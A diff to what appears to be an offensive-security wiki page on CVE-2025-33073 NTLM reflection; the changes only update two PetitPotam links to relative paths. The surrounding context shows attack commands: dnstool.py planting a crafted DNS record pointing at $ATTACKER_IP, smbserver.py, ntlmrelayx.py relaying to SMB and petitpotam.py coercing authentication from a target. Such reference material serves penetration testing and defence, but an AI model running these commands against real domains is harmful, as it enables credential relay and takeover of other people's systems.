@@ -247,7 +247,7 @@ CVE-2025-33073 ([patched June 2025](https://msrc.microsoft.com/update-guide/vuln
 dnstool.py -u "$DOMAIN"\\"$USER" -p "$PASSWORD" "$DC_IP" --action add -r "[TARGET_NETBIOS]1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA" -d "$ATTACKER_IP"
 ```
 
-2. An authentication coerce is then triggered (for example, with [PetitPotam](/ad/movement/mitm-and-coerced-authentications/ms-efsr)) from the target to the DNS record, relaying the authentication with [ntlmrelayx](https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py) (Python).
+2. An authentication coerce is then triggered (for example, with [PetitPotam](../mitm-and-coerced-authentications/rpc-coercions/ms-efsr.md)) from the target to the DNS record, relaying the authentication with [ntlmrelayx](https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py) (Python).
 
 ```bash
 # In a first terminal, ntlmrelayx waiting for an authentication to relay
@@ -295,7 +295,7 @@ smbserver.py -port $PORT share .
 ntlmrelayx.py -t smb://"$TARGET_FQDN" -smb2support
 ```
 
-3. An authentication coercion forces `lsass.exe` to authenticate toward the same share path (e.g. with [PetitPotam](/ad/movement/mitm-and-coerced-authentications/ms-efsr)):
+3. An authentication coercion forces `lsass.exe` to authenticate toward the same share path (e.g. with [PetitPotam](../mitm-and-coerced-authentications/rpc-coercions/ms-efsr.md)):
 
 ```bash
 petitpotam.py -u "$USER" -p "$PASSWORD" -d "$DOMAIN" "$ATTACKER_IP" "$TARGET_FQDN"
